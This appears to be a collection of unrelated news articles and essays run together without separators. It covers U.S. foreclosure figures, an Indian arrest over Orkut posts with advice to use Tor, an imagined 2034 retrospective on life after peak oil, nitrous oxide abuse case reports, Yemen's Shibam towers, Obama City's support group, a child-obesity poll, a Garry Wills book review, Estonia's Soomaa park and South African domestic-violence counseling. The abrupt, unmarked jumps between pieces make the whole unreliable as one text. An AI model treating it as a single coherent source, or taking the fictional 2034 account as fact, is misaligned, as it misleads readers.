NEW YORK ( Reuters ) - Home foreclosure filings in October edged up 2 percent from September but at 224,451 were a whopping 94 percent higher than a year earlier , real estate data firm RealtyTrac said on Thursday .
Foreclosure and for sale signs are seen in Antioch , California November 27 , 2007 .
U.S. home foreclosure filings in October edged up 2 percent from September but at 224,451 were a whopping 94 percent higher than a year earlier , real estate data firm RealtyTrac said on Thursday .
REUTERS / Erin Siegal
The figure , a sum of default notices , auction sale notices and bank repossessions , was down from a 32 - month peak in August however , Realty Trac , an online market of foreclosure of properties , said in its monthly foreclosure market report .
RealtyTrac said the national foreclosure rate was one filing for every 555 U.S. households in October .
“ Overall foreclosure activity continues to register at a high level compared to last year but it appears to have leveled off over the past two months after hitting a high for the year in August , ” James Saccacio , chief executive officer of Realty Trac , said in a statement .
In September , home foreclosure filings fell 8 percent .
Default rates in the subprime segment of the U.S. mortgage market , which caters to borrowers with poor credit histories , have jumped this year as the housing industry slowed and prices fell in many regions , particularly areas that benefited the most during the housing market ’s boom from 2000 to 2005 .
“ Default notices were down nearly 9 percent in October , indicating that some of the efforts on the part of homeowners , lenders and advocacy groups to find alternatives to foreclosure may be starting to have an impact .
On the other hand , bank repossessions were up nearly 35 percent , evidence that more homeowners who enter foreclosure are losing their homes , ” Saccacio said .
Nevada , once one of the hottest real estate markets and a favorite among investors , led the nation with one foreclosure filing for every 154 households , 3.6 times the national average .
Its 6,618 filings were up 20 percent from September and were nearly triple those reported in October 2006 .
California foreclosure activity fell nearly 2 percent from the previous month , but its rate of one filing for every 258 households still ranked the second - highest in the nation .
California ’s reported foreclosure filings totaled 50,401 , more than triple the number reported in October 2006 .
Florida ’s rate of one foreclosure filing for every 273 households ranks it third - highest .
Its 30,190 filings in October were down more than 9 percent from September but still up nearly 165 percent from a year earlier .
Ohio , Georgia , Michigan , Colorado , Arizona , Indiana and Illinois were other states with foreclosure rates ranking among the country ’s 10 highest .
On August 31 , Lakshmana Kailash K. was arrested in Bangalore , India , and charged with posting insulting images of a revered historical figure on the Internet .
The police claimed that he had uploaded disrespectful images of Chhatrapati Shivaji , the Indian equivalent of George Washington .
Free speech , it seems , does not extend to that sort of thing in India .

Normally , this would n't be a press - worthy story .
After all , India is not the first country to take a hard line against Internet free speech .
The Thai military regime blocked the entire YouTube Web site earlier this year after a single video posted to the site depicted a woman 's feet touching the head of the country 's king .
Likewise , Turkey also recently blocked YouTube for a video insulting the country 's founder .
So what makes this interesting ?
First , Mr. Kailash was alleged to have posted the pictures to Orkut , Google 's redheaded stepchild of a social - networking site .
Once Google divulged the IP address of the photo - uploader to the Indian authorities , the police sought the customer 's identity from Airtel , one of the country 's main telecommunication companies .
This is where things get interesting .
It turns out that the ISP gave the police the wrong information , and after three weeks behind bars , Mr. Kailash was released .
A police spokesperson was quoted by the Indo - Asian News Service as blaming the ISP for giving out the wrong information .
" It is not our fault and Lakshmana should take Airtel to court and not us . "
When contacted for comment , a Google spokesperson told me that , " Google has very high standards for user privacy and a clear privacy policy , and authorities are required to follow legal process to get information .
In compliance with Indian legal process , we provided Indian law enforcement authorities with IP address information of an Orkut user . "
This was the only comment that Google 's PR people would give me in response to a lengthy set of questions that I sent over .
In particular , I asked if they had received a court order for the information , or merely a polite request from the police .
Their response leaves things very hazy .
So what are the lessons to learn from this incident ?
Given that Mr. Kailash did n't actually post the photos , I can't provide him with any advice for protecting his privacy on the Internet .
All I can suggest is that he hire a very good lawyer , and attempt to take Airtel to the cleaners .
If we assume , however , that Airtel eventually handed over the identity of the real " criminal , " then perhaps some advice can be offered .

Internet users :
If you live in a country that does not respect freedom of speech and where you can get jailed for posting social commentary or otherwise subversive information to the Internet , technology can help you .
Likewise , if you live in a country where the major telecom companies have willingly ( and for a good profit ) sold out their customers ' privacy to large - scale illegal government surveillance , privacy - enhancing technologies can keep you safe .
The most important utility in any privacy - concerned Internet user 's toolbox should be Tor , an anonymizing Web proxy .
Based on technology originally designed by the U.S. Naval Research Labs , funded at one point by the Electronic Frontier Foundation and later by Voice of America , Tor has support from a strange yet wide variety of private and public groups .
The EFF has published a guide to blogging anonymously , which is primarily based on Tor. Simply put , had the Indian Orkut user signed up for his account and posted the insulting photographs using Tor , neither he nor any other innocent Airtel customers would be locked up .
While this incident did n't come anywhere close to dissidents fighting for democracy , some strong parallels can be drawn between Google 's decision to hand over IP addresses to Indian police , and that of Yahoo , which has handed over the IP addresses of pro-democracy activists to the Chinese authorities on multiple occasions .
As a result of the company 's snitching , Yahoo is facing a lawsuit , and a U.S. congressman has proposed legislation to make the company 's actions illegal .
Interestingly , the Global Online Freedom Act , which was proposed by Representative Christopher Smith ( R - NJ ) in 2006 , could also cause problems for any future India - based snitching by Google , should it ever become law .
The bill , if passed into law , would prohibit any U.S. Internet company from providing any foreign official of an Internet - restricting country information that " personally identifies a particular user ... except for legitimate foreign law enforcement purposes as determined by the Department of Justice . "
Companies that violated this prohibition could be sued in U.S. courts by those foreigners whose information they divulged .
Fortunately for the Internet giants , the bill has been stuck in committee since 2006 and does n't show any signs of life .
At long last the goal of “ Not One Drop ” of oil is being burned to transport people and freight over the nations railroads .
All of the main and secondary lines are electrified with battery locomotives for some short spurs .
Rapid reductions in world carbon emissions ( almost as great as US reductions ) , plus some negative feedback loops , have kept Global Warming effects manageable .
Persistent and prolonged droughts in the American Southwest have been the largest effect so far in the USA .
After an extended period of bewildering , painful and rewarding transition , the people of the USA finally feel that they have found their feet underneath them , with a clear and hopeful path to the future .
Oil consumption is down to 6.6 million barrels / day , 30 % of our 2007 peak oil use , and CO2 emissions are 26 % of their 2011 peak , a matter of pride for most Americans .
A nationwide system of grade separated main lines are complete with new extensions being added every year .
Two tracks for heavy freight moving at 50 to 70 mph and one or two tracks ( three in California and the Northeast ) for passengers and light & medium density freight moving at maximum speeds of 110 to 125 mph .

There is growing demand for true high speed rail and politicians are searching for funding .
All interstate highways are heavily tolled and reduced to no more than 4 lanes ( a few urban 6 and even 8 lanes survive ) with some down to one travel lane in each direction with a wide and unmaintained shoulder .
Heavy trucking is reduced to shuttling containers from the nearest railhead to those remaining warehouses and factories not directly served by rail , plus a few specialty roles such as delivering wind turbines to remote rural locations .
Boeing 797s ( successor to 737 using 787 technology ) rule the skies , with different models providing 130 to 210 seats on direct flights between major rail centers at fuel saving cruise speeds of 400 to 450 mph .
The new paradigm for cross-country travel is to take rail to the regional hub airport , catch one of the 1 to 3 direct daily flights to another hub airport and rail to the final destination .
Regional passenger rail dominates inter-city trips up to 250 miles and becomes a minor mode for trips much over 600 miles .
Overall travel volumes have declined dramatically due to increasing costs and reduced economic activity .
Barge traffic picked up significantly twenty years ago , with container barge trains stopping daily ( one up stream bound , the other downstream bound ) at every major river port .
Ever higher oil prices , have made electrified railroads more competitive and they have taken market share from the barges in recent years .
Tugs are experimenting with coal emulsion fuel as a counter measure .
The North American electrical grid failed in it ’s goal of 90 % non-GHG generation due to a hotter than expected summer , but 89.7 % is still a major step forward !
Wind turbines supplied nearly half the total MWh , and nuclear power over a quarter .
For the first time the USA completed six nuclear reactors this year ( with one each in Canada and Mexico as well ) .
The new large Canadian hydro projects are pretty well complete and the microhydro saturation in USA is well over half completed .
Several percent come from solar thermal in the desert Southwest ( USA & Mexico ) and solar photovoltaic is now growing exponentially , reminding many of the earlier “ Rush to Wind ” .
A growing grid of HV DC lines ( 3 to 10 GW capacity each ) connect wind turbines from the Wind Export Belt to both pumped storage and demand centers in redundant triangles .
The first such triangle connected western Oklahoma , pumped storage near Chattanooga Tennessee and Orlando Florida ( with a spur to Miami ) .
A short spur from Chattanooga to near Birmingham Alabama created more parallel paths and added Alabama to the new HV DC grid .
Other HV DC triangles connect Southern California to Wyoming and Montana ( started in 2006 ) with pumped storage in the Rockies and North Dakota / Manitoba with the Upper Peninsula of Michigan and Chicago .
And thirty more such triangles exist ..
Occasionally fossil fuels ( coal and natural gas ) are burned to generate electricity during a cold winter spell , but coal fired plants are routinely fired for months each summer to meet the still large air conditioner demand .
Debate over how to turn these power plants off still rages .
Some point to the success of the conversion from oil heat to ground loop ( geothermal ) heat pumps and suggest this is a worthwhile path to reduce residual residential natural gas demand and to create more efficient air conditioning .
Others point to the success of implementing German standards for insulation and energy efficiency for new construction ( R - 49 walls etc for most of the nation ) and suggest accelerated scrapping of inaccessible housing ( with the well known other energy savings and carbon capture that go with converting Suburbia back to orchards ) and further expanding TOD housing , both in Urban and Suburban commuter rail nodes .
They criticize the money wasted on retrofitting insulation into Exurban McMansions that were later abandoned , while others think the Great Retreat from Suburbia has run it ’s course and we should focus more on retrofitting older construction and less on new .
All sides agree with strengthening the insulation and energy efficiency upgrades required before rental housing can be sold .
There is also a raging debate between solar , wind and nuclear supporters on how best to eliminate the summer coal burning .
Wind proponents point to their lower cost of production / MWh and that new nukes will require just as much pumped storage as would new wind , They also mention the Bellefonte Incident .
Nuke supporters say that several times each year we have a surplus of wind already ( all pumped storage full , nuke production stepped down and still power goes to waste ) and fewer than 100 people died in the Bellefonte Incident .
Wind turbine maintenance kills a dozen every year .
Wind production drops in the summer and there is no practical way to store large amounts of power from spring into summer unless the Great Lakes Scheme is implemented .
And even holding back the spring waters in the Great Lakes till summer would not be enough .
Solar proponents argue that solar output peaks at noon on summer solstice , and has not significantly declined by mid-afternoon in late summer when coal burning reaches a maximum .
Solar is underrepresented in the national grid and more solar will help the grid .
And many Greens just want higher in - door temperatures and less air conditioning till the last coal fired plant is mothballed !
Arlington Texas is now the last American town over 100,000 without electrified public transportation ( just as it was the only town without public buses 25 years ago ) .
Needless to say Arlington is a dangerous , bankrupt slum and will soon slip below 100,000 population ( at least those willing to be counted ) .
The Texas Rangers moved from their Arlington stadium to a light rail hub over a decade ago so that fans could get to games .
Elsewhere , an array of subways and elevated rapid Rail , plus Light Rail , Streetcars and electric trolley buses supply the majority of urban Vehicles Miles Traveled and commuter trains keep the remaining suburban townships going .
At night trolley freight uses the tracks to distribute food and goods .
Most towns of 60,000 and more have some form of electrified transit today .
Boston was a historic example of a comprehensive commuter rail network that can support walkable suburbia clustered around rail stations .
Today , dozens of cities now emulate Boston and almost a fifth of the population lives in Transit Suburbia as it is now called .
Polls from the turn of the century showed that 30 % of Americans wanted to live in Transit Orientated Development but fewer than 2 % could because of the lack thereof .
Today , in a reverse of the White Flight to Suburbia from 1950 to 1970 , almost exactly one third of the population lives in TOD and another quarter want to as part of the Great Retreat from Suburbia .
Electric assisted tricycles have become the icon of aging baby boomers , and the constant butt of jokes on late night TV talk shows .
They are the ULTIMATE un-cool means of transportation and NO self - respecting teenager would EVER be caught on one !
The “ in ride ” is a recumbent bicycle with an oversized rear tire and fairings painted in iridescent ( or black ) paint , preferably with a matching single wheel trailer for “ stuff ” .
Early in the Post - Peak Oil Era , many turned to gasoline powered scooters and small motorcycles , but first public policy and then economics turned against them when it was realized that 100 mpg was not good enough ( and accidents mounted ) .
Instead electric assist bicycles were encouraged and many two ways streets were turned into one way streets with the other lane becoming a two way bike lane .
Segways also developed a loyal following .
In the early years Post - Peak Oil , Neighborhood Electric Vehicles ( such as the classic http://www.gemcar.com
The New Model T ) and Bicycles contested for modal share with the out - of - shape and obese strongly favoring NEVs at first .
Cultural values and parking fees lead to today ’s dominance by bicycles but NEVs still occupy a large niche .
Plug -in Hybrids and small diesels also had a contest for modal share .
Farmers and other rural residents tend towards small diesels , many of whom make their own ( or buy a neighbors ) small scale bio -diesel .
Surviving Suburbanites tend towards PHEVs , which typically get 100 to 130 mpg today .
However , since the cost of maintaining the remaining roads ( asphalt is just very heavy oil that can be upgraded to fuel ) has escalated dramatically and public policy has placed the full cost of all city streets and rural roads on privately owned cars and trucks ( most heavily on those that use oil ) and removed it from property taxes ( bicycles get a free ride ) , the inflation adjusted cost of operating a 100 mph PHEV or small diesel is several times that of operating a Hummer in 2009 .
Given the economic decline Post - Peak Oil , driving a full size car is reserved for the well - to - do and is occasionally meet with hostility , especially towards those that drive oil burners and not straight EVs .
Most Post - Peak Oil Suburbia descended into a spiral that duplicated the post - WW II decline of central cities and downtowns .
Mortgage defaults started the decline , with empty houses first depressing the market , followed by declining public services , poorer schools and changing population demographics and ever rising oil prices past all expectations .
The revocation of prohibitions against “ red lining ” ( to reduce massive mortgage losses ) brought back the same post - WW II effects that central cities once experienced .
Willing buyers had trouble financing Suburban housing due to their perpetually declining values and massive overhang of unsold properties .
Recent academic studies have shown that once a subdivision stayed below 42 % occupancy for over a year , there would be no recovery .
Occupancy rates quickly plunged in “ Suburban Flight ” after this tipping point .
After that , experience has taught us that salvaging the empty homes for materials and planting the land with orchard crops was usually the optimum choice .
Housing square feet / capita has more than doubled in the 60 years prior to Peak Oil , and declined that much and more in the last 25 years .
Retail space had expanded by an order of magnitude and underwent a similar decline .
The prolonged economic depression due to persistent and ever growing oil shortfalls resulted in much more compressed populations relying on primarily non-oil transportation .
Even 100 mpg scooters cost too much for most people .
Walking , bicycling ( electric assist for the better off ) , electrified rail , mainly small electrical vehicles for the upper class , and even the occasional horse or a donkey with cart .
“ The Energy Solution ” first put forward in 2008 included housing as part of the transportation fuels solution .
Reduced natural gas use for water heating ( tankless gas hot water heaters , heat pump water heaters and solar water heaters ) , space heating ( much better insulation & windows , ground loop heat pumps ) and electrical generation ( wind turbines , solar PV & thermal , nuclear power plants and pumped storage ) released natural gas and propane / butane for use as specialty transportation fuels despite the declining supply of natural gas .
Conservation exceeded natural gas depletion in a mad rush !
As we all know , the first decade post - Peak Oil was quite difficult .
History calls it the “ Bad Tens ” for good reason .
Suicides peaked at 8 times pre-Peak levels for a decade post - Peak and are now down to just twice pre-Peak levels .
Demographics shifted significantly , as they did when the Soviet Union collapsed .
Life expectancy declined almost a decade in the USA , but it was more gender balanced that in Russia .
Overall mortality increased dramatically in the Bad Tens , just as it did a few years earlier in post - Katrina New Orleans .
The long term effects of obesity and diabetes combined with chaotic healthcare for most citizens and simple despair and disorientation resulted in a 50 % increase in the death rate for those ten years .
Healthcare reforms and a radical change in lifestyle and diet have turned this downward slide around and life expectancy today is now just 1.7 years less than it was in 2007 !
Birth rates fell dramatically in the Bad Tens and have crept ever lower year by year since then , and this year saw the first small increase in fertility to 1.21 children / woman .
A massive expulsion of non-citizens ( both legal and illegal ) followed the 2016 election .
Many American living abroad were forced home as a result but the USA was left with 15 million fewer consumers , significant social issues and a still raging debate .
Much has been lost in the last quarter century , but few regret the loss of every greater extremes of consumer excess .
The use of the word “ consumer ” is now considered a pejorative and an insult to one ’s values .
“ Citizen ” is a title of pride again , with an implied understanding of duties and obligations that go with that title .
And much has been gained .
Social isolation shrank with Suburbia and the economy .
Many found compassion and caring for their fellow humanity within themselves in the Bad Tens .
People think , and talk and plan , of the “ generations to come ” and the New America .
As we close this year of 2034 , for the first time in a quarter century , we can now say that next year looks to be better than this last year .
Our problems are not solved , but we know the solution and we are confident of our ability to work and sweat towards sustainable , workable solutions !

After inhaling laughing gas every day for ten years , a Taiwanese man started to develop bizarre neurological problems .
Whippets , his drug of choice , are small cylinders of nitrous oxide .
They are purportedly used as a propellant for whipped cream .
Recreational drug users ( shown right ) sometimes fill balloons with the gas and then inhale it repeatedly to obtain a brief high .
In November 2003 , the Taiwanese man 's sense of touch became so faint that he could barely handle chopsticks .
Even worse : he felt sensations similar to electrical shocks in his neck and legs .
At Taipei Veterans General Hospital , Chia - Yi Lin , Kwong - Kum Liao , and their colleagues examined their patient with an MRI scan .
Part of his spinal column had degenerated .
That was no surprise since laughing gas interferes with the production of myelin , a fatty coating that surrounds nerves and helps them send signals .
In the January 2007 issue of Clinical Toxicology , Lin and Liao explained that the gas inactivates vitamin B12 and the junkie was already running low on that nutrient .
Daily doses of the gas for ten years worsened his dietary deficiency , leading to the severe neurological damage .
At the end of their correspondence , the doctors did not say what became of their patient , but they made it clear that he was not alone .
The following September , a correspondence to the Medical Journal of Australia described a 20 - year - old woman that developed paralysis in her legs after inhaling ten to twenty canisters of whipped cream propellant per day for almost two weeks .
In this case , the young lady claimed that her actions were an attempt to cope with the pain of a sprained ankle , but she was no stranger to drug abuse .
Before her nitrous oxide binge , the junkie had used heroin and enrolled in a methadone program .
When she was found trapped in the back seat of a car , there were approximately sixty empty canisters at her feet .
Blood tests showed that her kidneys were failing , she was anemic , and her vitamin B12 was very low .
With such a complicated set of symptoms , the doctors were unsure of what was wrong .
As they sat their patient up to take a spinal fluid sample , her heart rate slowed to a deadly crawl .
Responding quickly , the physicians revived the imperiled woman with CPR and transferred her to an intensive care unit .
Michaela Cartner , a doctor at Prince Charles Hospital in Brisbane , said in her report that the patient recovered partially after receiving doses of vitamin B12 and the amino acid methionine .
Both of those chemicals helped to rebuild the damaged myelin coating around her nerve fibers .
Seven months later , and after an aggressive rehabilitation program , the unfortunate girl could walk again .

Most people think of skyscrapers as inventions of the post - industrial world , characteristic of tightly - packed urban environments .
Density in cities is , of course , nothing new .
Surprisingly , neither is the art of constructing tall buildings , as evidenced by the city of Shibam .
Shibam , Yemen has been continuously occupied for over two millennia .
This remote desert city boasts buildings of mud brick that reach up to fourteen stories in height , many dating back hundreds of years ( and parts of which date back thousands ) .
Since becoming a World Heritage city over 20 years ago , the area has largely catered ( for better or worse ) to tourists .
However , this has at least helped preserve both the buildings and aspects of the regional culture that might otherwise have been lost .
Shibam ’s structures are built of load - bearing materials , as opposed to modern frame - and - cladding techniques ( the building blocks of contemporary skyscrapers ) .
As such , the bases of the buildings are up to four feet thick .

Japanese Town of Obama Has New Hero Democratic candidates both win Japanese supporters , for very different reasons .
TOKYO , Japan , Feb 8 , 2008  -- Covering Japan probably was not part of the campaign strategy for either Barack Obama or Hillary Clinton .
But the heat is on among some supporters in Japan who feel a somewhat unusual connection with each candidate .
The residents of Obama City in Fukui Prefecture in central Japan cannot contain their excitement about the prospect of having someone named " Obama " being the U.S. president .
And the employees of a farming and construction machinery maker in southern Japan are cheering for the candidate whose first name is the same as one of the transportation machines they build and sell : the " Hillary . "
In the coastal city of Obama , about 300 miles northwest of Tokyo , some residents formed a support group called " Group that Supports Barack Obama Voluntarily " in early February .
Of course , none of the group 's original 18 members in this city , with a population of a little more than 32,000 , are qualified to cast a vote in the election .
" But we wanted to do something because Mr. Obama does not feel like a stranger to us .
We both carry the name Obama , and he is like a relative to us , " said Seiji Fujihara , the group 's secretary general .
The group members gathered and monitored the results of Super Tuesday primaries as many Japanese TV stations gave a blow - by - blow report of the voting .
" He is a good public speaker .
I love his voice , too .
I am sure he will bring a breath of fresh air to the American political system , " said Fujihara .
" Two elderly farmers called me after Super Tuesday and said they wanted to join the group .
I think our support base will keep growing . "
The group set up an ad - hoc headquarters , including a banner and a caricature of Barack Obama , at a hotel where Fujihara works .
It is planning to make head bands and even Japanese " manju " sweets — Japanese steamed cake with red bean paste filling spelling out " Obama . "
Fujihara said the group will gather to watch the results of the March 4 primary voting as well .
" If Mr. Obama becomes the president , we will form a delegation and try to visit him at the White House .
That would be awesome , " said Fujihara .
Obama City and Barack Obama have some history , according to Satoshi Emi , an Obama city official .
He said the city started to pay closer attention to Barack Obama when one of the residents said he saw Obama make a joke on Japanese television and said , " I am from Obama City in Fukui Prefecture , " back in 2006 .
" We were very excited to hear that , and our mayor sent Mr. Obama a thank - you note and two pairs of locally made chopsticks — one for Mr. Obama and one for Mrs. Obama , " said Emi .
" We never heard back from him , but we hope he got our message . "
Emi said the city would love to invite the Obamas to visit if the Illinois senator becomes president .
" Being a coastal city , Obama is known for great seafood .
We would love for him and his family to enjoy good food , " said Emi .
Clinton 's Japanese Constituents
Although she is not getting the support of an entire city , Hillary Clinton is also gaining popularity among certain people in Japan — specifically 180 employees of Chikusui Cany Com in Fukuoka City , Fukuoka Prefecture , 560 miles south of Tokyo .
Chikusui Cany Corn builds a transportation machine named after the presidential candidate .
Masami Hara , the company 's spokesman , said the transportation machine known as " Hillary " came out around the time Bill Clinton became president in 1992 .
" There also was a TV character named Hirari on Japanese television at that time .
Hirari means quickly or swiftly in Japanese , " said Hara , " So we named the machine Hillary because the machine can be quickly or easily maneuvered .
We also like the sound of the name and what it represented in the United States . "
The company has sold more than 20,000 units of " Hillary " at $ 3,400 apiece .
" Mrs. Clinton is just like our Hillary — the machine is small but it can carry any material that weighs up to 660 pounds .
Compact and durable — is n't Hillary Clinton like that ? " said Hara .
Hara said the U.S. presidential race has been a source of widespread conversation among employees as they watch their favorite candidates fight the battle .
" I heard some women in the U.S. do not like Mrs. Clinton , " Hara said .
" Our female employees say they like her .
She represents a hope and a change for America .
They look up to her . "
The company has products named after celebrities both from home and abroad .
The company introduced an industrial strength weed clipper named " Bush Cutter George Jr. " in 2003 .
With a price tag of $ 63,000 , the sales of Bush Cutter George Jr. have been slow compared to those of Hillary .
" But people love the name — Bush Cutter George Jr. — this name made the machine famous , " said Hara .
" So even when President Bush ends his work at the White House , our George Jr. will continue to work for us . "
When researchers from the University of Michigan surveyed more than 2,000 parents about their children ’s health , they heard some good news .
Despite the growing obesity problem , many of these parents could report that their sons and daughters , at least , were “ about the right weight . ”
The numbers , alas , told another story .
The parents were also asked to provide information about the children ’s height and weight  and many of the 6 - to - 11 - year - olds turned out to be obese .
Yet more than 40 percent of their parents appeared unaware of this .

The findings grew out of the National Poll on Children ’s Health by the C. S. Mott Children ’s Hospital .
The researchers found that over all , 25 percent of the children whose parents were surveyed were overweight or obese .
The social historian and essayist Garry Wills is one of our most lucid public intellectuals , and no one working today writes more clearly or with greater authority on the intersection of religion and public life .
“ Head and Heart : American Christianities ” is a major contribution to the national debate over separation of church and state and ought to be read by anyone perplexed by the current interplay of religion and politics .
If you ’ve wondered whether Sen. John McCain ( R - Ariz . ) was right when he said recently that America was founded as a “ Christian nation , ” whether other Republican presidential candidates ’ views on evolution are electorally relevant , what effect Sen.
Hillary Rodham Clinton ’s Methodism has on her social views or whether a candidate ’s stand on abortion must determine your vote , then this is your book .
Wills ’ argument is that American history has been marked by an oscillation between Enlightenment and Evangelism -- between head and heart .
He contends that the fruitful tension between these two poles contributed directly to the U.S. Constitution ’s single wholly original contribution to the political tradition : “ disestablishment of the official creed and separation of church and state . ”
It is precisely this innovative separation , Wills contends , that has allowed religion to flourish in America as it does nowhere else in the developed world .
It ’s also why he finds the hostility toward separation evinced by George W. Bush and the religious right so alarming .
Advertisement
Beginning with the Puritans , whose views and turbulence he outlines with great clarity -- and at great length -- Wills moves through the Great Awakening of the early 18th century and the Enlightenment backlash that followed it .
Speaking indirectly to the assertion of McCain and others about the Constitution ’s purportedly Christian origins , Wills points out that at the time of the founding , historians estimate that only about 17 % of Americans professed formal religious adherence , a historic low point .
The framers were deists , who believed in a divine providence knowable only through reason and experience and not prone to intervene in the affairs of men .
The reaction of the Great Awakening provided an American Unitarian boost that made Deism the religion of the educated class by the middle of the 18th century .
Legal scholar William Lee Miller writes that the chief founders of the nation were all Deists -- he lists Washington , Franklin , John Adams , Jefferson , Madison , Hamilton and Paine , though many more leaders of the founding era could be added ( Benjamin Rush , John Witherspoon , David Rittenhouse , Philip Freneau , Joel Barlow , Aaron Burr , James Wilson , Gouverneur Morris , Tench Coxe , to name some ) .
Their agreement on the question of God crossed political and geographic lines .
Federalist and Republican , North and South , an Adams and a Jefferson , a Hamilton and a Madison -- all were professed Deists .
Wills agrees with Perry Miller ’s contention that the founders were of a “ liberality of spirit which must forever and properly remain a scandal to the rank and file of professing American Christians . ”
He points out that " [ b] elievers in America as a Christian nation do not much like Jefferson the Deist .
But they like his Declaration of Independence because of its reference to ‘ the laws of nature and of nature ’s God . ’
Though this was not a legislative document , it is more useful to them than the supreme legislative document of the United States , the Constitution , which . . . does not mention God at all . ”
Advertisement
Even in his own time , “ Jefferson attracted lightning , ” Wills writes .
“ That is why he is the person most talked about in the area of religious freedom .
. . .
Physically , Jefferson towered over the minute Madison by almost a foot .
Symbolically , his stature is even greater .
But this deflection of primary attention to Jefferson has given an advantage to those who oppose or minimize the separation of church and state , since Madison is the best defender of that constitutional innovation -- more consistent than Jefferson , more radical and more influential .
Jefferson revered the First Amendment .
Madison wrote it . ”
As president , Madison , like Jefferson , declined to proclaim days of prayer or fasting , was skeptical of military chaplaincies and even opposed allowing churches to incorporate themselves , reasoning that the grant of corporate status , with its protections and written bylaws , violated the separation principle .
Wills moves chronically through U.S. history , outlining the ebb and flow of enlightenment and evangelism through the decades and centuries , pausing throughout to provide thumbnail sketches of the significant personalities involved .
Eventually he comes to the Bush administration : “ The right wing in American likes to think that the United States government was , at its inception , highly religious , specifically highly Christian , and -- and more to the point -- highly biblical . ”
This was not true of that or any later government -- until 2000 .
Wills is particularly shrewd in delineating Karl Rove ’s part in bringing this about :
While crediting the former White House advisor ’s mastery of electoral technologies , Wills argues that “ his real skill lay in finding how to use religion as a political tool . . . .
He shaped the hard core of the Republican Party around resentments religious people felt over abortion , homosexuality , Darwinism , women ’s liberation , pornography and school prayer . . . .
Rove made the executive branch of the United States more openly and avowedly religious than it had ever been , though he had no discernible religious belief himself .
His own indifference allowed him to be ecumenical in his appeal to Protestants , Catholics and Jews . ”
Advertisement
The Protestant wing of this coalition , Wills writes , was predisposed toward Bush , but Catholics were the big electoral prize .
Pollsters have noted that Catholics who regularly assist at Mass are more socially conservative and open to GOP candidates .
Moreover , Father Richard John Neuhaus , editor of the influential journal First Things and a convert from Lutheranism ’s evangelical wing , was a fixture in the Bush White House .
Considering abortion
As Wills points out , Rove made abortion the “ linchpin ” of his strategy to bring Catholics and evangelicals -- antagonists historically -- into accord within the Bush coalition .
Other conservatives were quick to see abortion as common ground .
William Kristol , the neoconservative editor of the Weekly Standard , wrote , “ The truth is that abortion is today the bloody crossroads of American politics .
It is where judicial liberation ( from the Constitution ) , sexual liberation ( from traditional mores ) , and women ’s liberation ( from natural distinctions ) come together .
It is the focal point for liberalism ’s simultaneous assault on self - government , morals and nature . ”
Wills observes that what “ made abortion so useful to Rove is the fact that it is the ultimate ‘ wedge issue , ’ because it is nonnegotiable ” -- a position dictated by the commandment “ Thou shalt not kill . ”

“ Fair enough .
But is abortion murder ?
Most people think not , ” Wills writes .
What follows on that is perhaps the most lucid and relevantly learned concise discussion of abortion as a moral / theological question as you ’re likely to read anywhere .
Once again , Wills ’ deep mastery of the primary sources and his respect for them as a believer himself lend his argument a compelling authority .
He points out that Catholic opposition to abortion is a recent development .
“ Abortion is not treated in the Ten Commandments -- or anywhere in Jewish Scripture .
It is not treated in the Sermon on the Mount -- or anywhere in the New Testament .
It is not treated in the early creeds .
It is not treated in the early ecumenical councils . ”
For that reason , Augustine , whose knowledge of both Jewish and Christian scriptures was encyclopedic , wrote , “ I have not been able to discover in the accepted books of Scripture anything at all certain about the origin of the soul . ”
Similarly , Thomas Aquinas , “ lacking scriptural guidance , ” relied upon Aristotle ’s natural philosophy .
“ So he denied that personhood arose at fertilization by the semen .
God directly infuses the soul at the completion of human formation , ” Wills writes .
“ Much of the debate over abortion is based on a misconception , that this is a religious issue , that the pro-life advocates are acting out of religious conviction .
It is not a theological matter at all .
There is no theological basis for either defending or condemning abortion .
Even the popes have said that it is a matter of natural law , to be decided by natural reason .
Well the pope is not the arbiter of natural law .
Natural reason is . ”

Part of what lends “ Head and Heart ” its particular force and authority is that Wills ’ own encyclopedic knowledge of the separation question , of the history of religion in this country and of religious believers ’ theological convictions is complemented by profound reflection and a deep affection for both the American tradition and religious belief .
The noun “ affection ” is consciously chosen because one suspects that part of the reason Wills recognizes our historical tension between head and heart so readily -- and finds it so fruitful -- is that he has rehearsed it in his inner life .
It will come as no surprise , therefore , that the author ’s distaste for the current state of affairs not withstanding , his conclusion is optimistic .

EXCURSIONS
Soomaa National Park
Soomaa National Park , a place like no other , sits about 105 miles south of Tallinn .
“ Soomaa ” means land of bogs — appropriately named as it is formed by four bogs and split by the tributaries of the Parnü River — creating a sparse landscape with an almost prehistoric glow .
This is the land of five seasons .
Spring , summer , fall , winter and flood .
Summer is the best time to go so you can hike miles into the swamplands on wooden planks to swim in the bogs , which are rich with legendary , rejuvenating health properties .
The water is surprisingly clear and crisp , but so black that you might not see your limbs mid-stroke .
In Estonian culture , swimming in a bog is said to soften the skin and soothe the soul .
Just watch out for the legendary bog people .
Soomaa National Park offers bog-walks , mushroom picking , swimming and canoeing areas .
You can even learn about the traditions and making of Log-boats ( haabjas ) , the preferred mode of transportation during the flood season .
And at the end of the day , try the National Park Office ’s small and simple log cabin sauna in the forest overlooking a bog — an outdoorsy yet relaxing treat .
Once you find Soomaa , you might not want to leave .
Name another place in the world where you can float in saunas , walk for miles through swampland , delve deep into mineral rich bogs , and look fabulous talking about it later .

When she first came into the center , tired from the 45 minute walk in the heat , her face was flushed , but also black and blue .
He had hit her , Charlotte Theron explained .
Pummeled her with his fists and beat her with a stick .
Situated in the back of the local police station , the small Eldorado Park Family Crisis Center hears stories like this all the time .
Whether clients are referred by the police , ordered to show up by the courts , or just walk in , independently , the procedure here is always the same .
" How can we help you ? " they ask .
" Let us call your partner and talk to him too , " they suggest .
" Let 's figure out options , " they say .
Amnesty International reports that one woman in South Africa is killed by her husband or boyfriend every six hours .
The overwhelmed police cannot and do not sufficiently heed all domestic dispute calls for help .
And in those cases that do arrive in the equally overwhelmed courts , violent offenders are routinely let off with a slap on the wrist , deterring untold other women from ever complaining .
Marriage counseling is not , and cannot be , the only solution to domestic violence , stresses counselor Mona Ramlah .
Nor can counseling fix the broader underlying factors contributing to the violence – poverty , unemployment , drugs , and the unresolved rage and inferiority complexes that are the legacies of apartheid .
But it can , sometimes , help .
Ms. Ramlah has been counseling in this neighborhood , a poor township adjoining Soweto , for almost 20 years .
Sometimes – especially in cases where there is a court order – couples will come in together .
Otherwise , typically , a woman will come in alone , and Ramlah will then send a letter back home with her , asking that the spouse come for a meeting .
They almost always do , she says – and that is when the work begins .
In most cases , she admits , she can't save the troubled marriages .
The violence is too extreme , the miscommunication too great , the future seems too difficult .
